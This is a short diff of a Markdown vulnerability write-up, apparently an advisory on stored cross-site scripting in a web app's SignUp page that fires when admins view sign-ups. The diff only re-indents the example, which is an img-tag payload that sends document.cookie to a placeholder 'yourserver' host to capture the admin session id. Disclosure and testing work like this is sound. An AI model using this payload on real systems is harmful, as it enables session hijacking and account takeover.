@@ -58,7 +58,7 @@ The XSS code can be entered on the SignUp page, and executed on the Admin page w
 ### How to identify
 1. Enter this code into the address field on the SignUp page;
 
-```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```
+   ```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```
 
 2. Log in to the Admin pages and take a look at the sign-ups. The session-id should now be written to the Apache logs of “yourserver”. 
 But you can also test with code like this, in any of the fields on the SignUp page; 
